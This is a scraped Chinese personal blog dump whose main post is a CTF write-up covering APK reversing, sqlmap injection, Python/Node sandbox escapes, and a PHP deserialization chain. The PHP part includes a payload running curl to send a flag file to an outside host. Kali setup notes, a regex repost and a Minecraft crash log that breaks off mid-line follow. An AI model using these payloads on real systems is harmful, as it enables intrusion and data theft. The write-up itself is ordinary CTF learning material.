Re-WhatsApk看见APK第一件事干嘛？直接拖进jeb就完了，奥利给，直接先看看Manifest flag果然不再，看我进bytecode搜索一下SYC，我去居然没的，再搜flag，好家伙这么多，WDNMD，浪费30min后无果，看了下hint，安卓APK结构，那我就zip打开呗，最后产还是搜索SYC，在resources.arsc中找到flag SYC{WelC0me_to_android!} Re-HelloAndroid好家伙，我直接扔进jeb，进bytecode搜索SYC，直接秒杀SYC{Android_in_Java_is_easy!} Web-带恶人六撞sqlmap -u http://49.234.224.119:7415/?id=1 扫描到注入方式1）boolean-based blind 2）error-based 3）time-based blind 4）UNION query sqlmap -u http://49.234.224.119:7415/?id=1 -b –current-db –current-user 得到结果:current user: ‘root@localhost’ current database: ‘geek_sql’ 进而sqlmap -u http://49.234.224.119:7415/?id=1 -D geek_sql -tables 得到：retrieved: ‘blog’ retrieved: ‘fllllag’ 此时我们得知数据库名和表名，接下来就是爆内容 使用:sqlmap -u http://49.234.224.119:7415/?id=1 –dump -D geek_sql -T fllllag 得到: id fllllllag 1 welcome_to_syclover 2 longlone_need_gf 3 SYC{liuzhuang_4s_@_G00d_m@n} Web-FamilyJailPackageYou know some birds are not meant to be caged, their feathers just too bright. ---- The Shawshank Redemption 典型沙箱逃逸，第一层python逃逸，第二层nodejs逃逸，第三层fakechroot逃逸，第一个直接在freebuf抄别人源码 getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;ls&#39;) getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;cat flag&#39;) ssh nodejs@server.com -p 2222 password: nodejsqwqwqwq ref:https://www.freebuf.com/articles/network/203208.html ref:https://www.youtube.com/watch?v=EMYiGC9ZobY 第二个nodejs难度极大，没接触过，去网上找各种参考 瞎搞反正我也不太懂JS，参考了 nodejs ref:https://www.youtube.com/watch?v=-RnGbbIwTa8 最后一个，其实不难，两行秒杀，只可惜容易让人摸不到头脑，但是也有提示了，文件含有fakechroot 暴露了环境信息 https://manpages.debian.org/jessie/fakechroot/fakechroot.1.en.html https://github.com/dex4er/fakechroot/issues/64 env ls / env cat /flag SYC&#123;you_r_re@lly_good_at_jailbreaking&#125; Web-EpicPOPChain这题直接非预期好吧 &lt;?php //error_reporting(0); ​ ​ class pop &#123; public $aaa; ​ public static $bbb = false; ​ public function __wakeup() &#123; echo &quot;bypass failure&quot;; //Do you know CVE? echo &quot;The class pop should never be serialized.&quot;; $this-&gt;aaa = NULL; &#125; ​ public function __destruct() &#123; echo &quot;i will die\\n&quot;; for ($i=0; $i&lt;2; $i++) &#123; //exec(); var_dump(self::$bbb); if (self::$bbb) &#123; echo &quot;i have run the specific func&quot;; $this-&gt;aaa[1]($this-&gt;aaa[2]);//如果bbb为真 则执行变量的函数方法 &#125; else &#123; echo &quot;i have NOT run the specific func&quot;; self::$bbb = call_user_func($this-&gt;aaa[&quot;object&quot;]);//执行用户自定义函数切无参数传递 //这里主要的问题就是calluserfunc相当于是在外部调用了函数 //说白了 此处就是要调用 getAFKL &#125; &#125; &#125; &#125; ​ class chain &#123; ​ private $AFKL=true; ​ private function getAFKL() &#123; echo &quot;i have return true&quot;; return $this-&gt;AFKL; &#125; public function __set($name,$para) &#123; $this-&gt;AFKL=$para; &#125; &#125; ​ class epic extends chain &#123; public $aaa; ​ ​ public static $bbb = false; ​ public function __invoke() &#123; return self::$bbb; &#125; ​ public function __call($name, $params) &#123; return $this-&gt;aaa-&gt;$name($params); &#125; &#125; ​ if (isset($_GET[&quot;code&quot;])) &#123; unserialize(base64_decode($_GET[&quot;code&quot;])); &#125; else &#123; // highlight_file(__FILE__); &#125; ​ ​ $a=new pop; ​ $a-&gt;aaa=array(&quot;1&quot;=&gt;&#39;exec&#39;,&quot;2&quot;=&gt;&#39;curl --data &quot;dir=$(cat ../../../flag)&quot; http://106.15.74.181/curl.php&#39;,&#39;object&#39;=&gt;&#39;time&#39;); echo serialize($a); echo &quot;\\n&quot;; ​ //$b=&#39;O:3:&quot;pop&quot;:2:&#123;s:3:&quot;aaa&quot;;a:3:&#123;i:1;s:4:&quot;exec&quot;;i:2;s:67:&quot;curl --data &quot;dir=$(ls -la ../../../)&quot; http://106.15.74.181/curl.php&quot;;s:6:&quot;object&quot;;s:4:&quot;time&quot;;&#125;&#125;&#39;; $b=&#39;O:3:&quot;pop&quot;:2:&#123;s:3:&quot;aaa&quot;;a:3:&#123;i:1;s:4:&quot;exec&quot;;i:2;s:68:&quot;curl --data &quot;dir=$(cat ../../../flag)&quot; http://106.15.74.181/curl.php&quot;;s:6:&quot;object&quot;;s:4:&quot;time&quot;;&#125;&#125;&#39;; //echo base64_encode($b);//TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjQ6ImV4ZWMiO2k6MjtzOjY3OiJjdXJsIC0tZGF0YSAiZGlyPSQobHMgLWxhIC4uLy4uLy4uLykiIGh0dHA6Ly8xMDYuMTUuNzQuMTgxL2N1cmwucGhwIjtzOjY6Im9iamVjdCI7czo0OiJ0aW1lIjt9fQ== echo base64_encode($b);//TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjQ6ImV4ZWMiO2k6MjtzOjY4OiJjdXJsIC0tZGF0YSAiZGlyPSQoY2F0IC4uLy4uLy4uL2ZsYWcpIiBodHRwOi8vMTA2LjE1Ljc0LjE4MS9jdXJsLnBocCI7czo2OiJvYmplY3QiO3M6NDoidGltZSI7fX0== ​ 主要知识点 call_user_func虽然看名字是调用用户定义函数，但实际上调用系统内置函数也是可以的，所以利用time值为正，属于真，就可以RCE啦 虽然很累但是收获不小，以此WP记录熬夜的那段时间 2020.11.19","categories":[{"name":"Web","slug":"Web","permalink":"https://zwh-china.github.io/categories/Web/"}],"tags":[]},{"title":"kali升级","slug":"kali升级","date":"2020-11-14T20:16:07.000Z","updated":"2021-04-20T21:15:38.451Z","comments":true,"path":"2020/11/15/kali升级/","link":"","permalink":"https://zwh-china.github.io/2020/11/15/kali%E5%8D%87%E7%BA%A7/","excerpt":"","text":"apt update &amp;&amp; apt full-upgrade 如果安装过程中意外终止则使用 dpkg –configure -a 查看系统版本 lsb_release -a PS.记得把好看的壁纸保存了","categories":[{"name":"计算机知识","slug":"计算机知识","permalink":"https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"kali换语言","slug":"kali换语言","date":"2020-11-14T20:13:40.000Z","updated":"2021-04-20T21:15:38.449Z","comments":true,"path":"2020/11/15/kali换语言/","link":"","permalink":"https://zwh-china.github.io/2020/11/15/kali%E6%8D%A2%E8%AF%AD%E8%A8%80/","excerpt":"","text":"dpkg-reconfigure locales 找到对应语言按空格，把原来语言也按空格进行反选，确认，重启，生效。 另：apt是dpkg升级版，apt基于dpkg","categories":[{"name":"计算机知识","slug":"计算机知识","permalink":"https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"kali换源","slug":"kali换源","date":"2020-11-14T20:10:29.000Z","updated":"2021-04-20T21:15:38.448Z","comments":true,"path":"2020/11/15/kali换源/","link":"","permalink":"https://zwh-china.github.io/2020/11/15/kali%E6%8D%A2%E6%BA%90/","excerpt":"","text":"转自:https://blog.csdn.net/claytang/article/details/79384318 以root身份 vi /etc/apt/sources.list #中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #重庆大学deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib #官方源#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib 使用旧版kali经常会发生apt-get update 报错 -GPG error， invalid key 解决方法： 下载最新key添加到keylist wget -q -O - https://archive.kali.org/archive-key.asc apt-key add","categories":[{"name":"计算机知识","slug":"计算机知识","permalink":"https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"转-Python正则表达式匹配反斜杠问题","slug":"转载python正则表达式匹配反斜杠问题","date":"2020-11-10T14:52:06.000Z","updated":"2021-04-20T21:15:38.446Z","comments":true,"path":"2020/11/10/转载python正则表达式匹配反斜杠问题/","link":"","permalink":"https://zwh-china.github.io/2020/11/10/%E8%BD%AC%E8%BD%BDpython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D%E5%8F%8D%E6%96%9C%E6%9D%A0%E9%97%AE%E9%A2%98/","excerpt":"","text":"转载自csdnblog：Python****正则表达式匹配反斜杠’*\\*‘问题 在学习Python****正则式的过程中，有一个问题一直困扰我，如何去匹配一个反斜杠（即“**\\**”）？ 一、引入 在学习了Python特殊字符和原始字符串之后，我觉得答案应该是这样的：1）普通字符串：’**\\*\\*‘2）原始字符串：r’\\**’但事实上在提取诸如“3\\**8”反斜杠之前的数字时，我屡次碰壁，始终得不到结果。最终发现自己理解错了，原来原始字符串和“正则**转义”没有一点关系；下面详细谈一谈。 二、字符串转义 反斜杠，在Python中比较特殊，就是它可以用来构成一些特殊字符，比如“\\n”表示换行，“\\**t”表示制表符。下面是使用“\\**n”的一行代码： &gt;&gt;&gt;print (‘Hello**\\World\\**nPython’ ) 结果为：“Hello\\WorldPython“可以看到其中的“\\**n”已转义为换行符，而“\\W”没有发生转义，原因是“\\**W”在“字符串转义”中并不对应着特殊字符，没有特殊含义。 如果现在要求变了，要求不对“\\n”转义为换行，而是原封不动输出为“Hello\\**World\\**nPython”，该怎么办呢？ 1）可以这样写“Hello**\\World\\****\\nPython”，这样输出的时候，“字符串转义”会把“\\****\\”转义为“\\**”；2）也可使用另一种方法：原始字符串；原始字符串（即r’…’）：字符串中所有字符都直接按照字面意思来使用，不转义特殊字符。下面是使用原始字符串的代码： print r’Hello**\\World\\**nPython’ 结果为：“Hello\\World\\**nPython”可以清楚看到，在使用原始字符串之后，“\\**n”未被转义为换行符，而是直接被输出了。 三、正则转义 好了，上面讲的只是“字符串转义”。同理，在正则表达式中也存在转义，我们姑且先称其为“正则转义”，其与“字符串转义”完全不同，比如“\\d”代表数字，“\\**s”代表空白符。下面我们先编写开头的例子，然后再分析。提取“3\\**8”反斜杠之前的数字： #!/usr/bin/env python coding=utf-8import re string = ‘3\\8’m = re.search(‘(\\d+)\\\\\\\\‘, string) if m is not None: print m.group(1) # 结果为：3 n = re.search(r’(\\d+)\\\\‘, string) if n is not None: print n.group(1) # 结果为：3 正则表达式字符串需要经过两次转义，这两次分别是上面的“字符串转义”和“正则转义”，个人认为“字符串转义”一定先于“正则转义”。 1）’**\\****\\****\\*\\*‘的过程：先进行“字符串转义”，前两个反斜杠和后两个反斜杠分别被转义成了一个反斜杠；即“\\**\\**\\**\\”被转成了“\\**\\”（“”为方便看清，请自动忽略）。“字符串转义”后马上进行“正则转义”，“\\*\\”被转义为了“\\**”，表示该正则*式需要匹配一个反斜杠。 2）r’\\*\\*‘的过程：由于原始字符串中所有字符直接按照字面意思来使用，不转义特殊字符，故不做“字符串转义”，直接进入第二步“正则**转义”，在正则转义中“\\**\\”被转义为了“\\”，表示该正则式需要匹配一个反斜杠。 四、结论 也就是说原始字符串（即r’…’）与“正则转义”毫无关系，原始字符串仅在“字符串转义”中起作用，使字符串免去一次转义。 ref:https://www.cnblogs.com/Anesthesia-is/articles/11503398.html","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"记录一次MC服务器崩溃","slug":"记录一次mc服务器崩溃","date":"2020-11-01T10:23:55.000Z","updated":"2021-04-20T21:15:38.445Z","comments":true,"path":"2020/11/01/记录一次mc服务器崩溃/","link":"","permalink":"https://zwh-china.github.io/2020/11/01/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1mc%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B4%A9%E6%BA%83/","excerpt":"","text":"崩溃日志如下 -— Minecraft Crash Report —-// You’re mean. Time: 11/1/20 5:56 PMDescription: Watching Server java.lang.Errorat java.util.stream.IntPipeline$4$1.accept(Unknown Source)at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)at java.util.stream.AbstractPipeline.copyInto(Unknown Source)at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)at java.util.stream.ReferencePipeline$Head.forEach(Unknown Source)at java.util.stream.ReferencePipeline$7$1.accept(Unknown Source)at java.util.stream.StreamSpliterators$WrappingSpliterator$$Lambda$1630/1997267152.accept(Unknown Source)at java.util.stream.IntPipeline$4$1.accept(Unknown Source)at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)at java.util.stream.AbstractPipeline.copyInto(Unknown Source)at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)at java.util.stream.AbstractPipeline.copyInto(Unknown Source)at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(Unknown Source)at java.util.stream.AbstractPipeline.evaluate(Unknown Source)at java.util.stream.ReferencePipeline.collect(Unknown Source)at boo.b(SourceFile:112)at acs.a(SourceFile:187)at aba.c(SourceFile:111)at aba.b(SourceFile:63)at nd.a(SourceFile:230)at aax.c(SourceFile:173)at net.minecraft.server.MinecraftServer.b(SourceFile:879)at zg.b(SourceFile:303)at net.minecraft.server.MinecraftServer.a(SourceFile:808)at net.minecraft.server.MinecraftServer.w(SourceFile:667)at net.minecraft.server.MinecraftServer.a(SourceFile:254)at net.minecraft.server.MinecraftServer$$Lambda$3304/1905868474.run(Unknown Source)at java.lang.Thread.run(Unknown Source) A detailed walkthrough of the error, its code path and all known details is as follows:-- Head –Thread: Server WatchdogStacktrace:at java.util.stream.IntPipeline$4$1.accept(Unknown Source)at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)at java.util.stream.AbstractPipeline.copyInto(Unknown Source)at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)at java.util.stream.ReferencePipeline$Head.forEach(Unknown Source)at java.util.stream.ReferencePipeline$7$1.accept(Unknown Source)at java.util.stream.StreamSpliterators$WrappingSpliterator$$Lambda$1630/1997267152.accept(Unknown Source)at java.util.stream.IntPipeline$4$1.accept(Unknown Source)at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)at java.util.stream.AbstractPipeline.copyInto(Unknown Source)at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)at java.util.stream.AbstractPipeline.copyInto(Unknown Source)at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(Unknown Source)at java.util.stream.AbstractPipeline.evaluate(Unknown Source)at java.util.stream.ReferencePipeline.collect(Unknown Source)at boo.b(SourceFile:112)at acs.a(SourceFile:187)at aba.c(SourceFile:111)at aba.b(SourceFile:63)at nd.a(SourceFile:230)at aax.c(SourceFile:173)at net.minecraft.server.MinecraftServer.b(SourceFile:879)at zg.b(SourceFile:303)at net.minecraft.server.MinecraftServer.a(SourceFile:808)at net.minecraft.server.MinecraftServer.w(SourceFile:667)at net.minecraft.server.MinecraftServer.a(SourceFile:254) -- Thread Dump –Details:Threads: “Netty Server IO #63” Id=733 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #62” Id=732 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #61” Id=731 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #60” Id=730 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #59” Id=729 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #58” Id=728 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #57” Id=727 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #56” Id=726 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #55” Id=725 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #54” Id=724 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #53” Id=723 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #52” Id=722 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #51” Id=721 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #50” Id=720 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #49” Id=719 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)… “Netty Server IO #48” Id=718 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40at java.util.Collections$SynchronizedCollection.add(Unknown Source)- blocked on java.util.Collections$SynchronizedRandomAccessList@206966edat aax$1.initChannel(SourceFile:108)at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)at 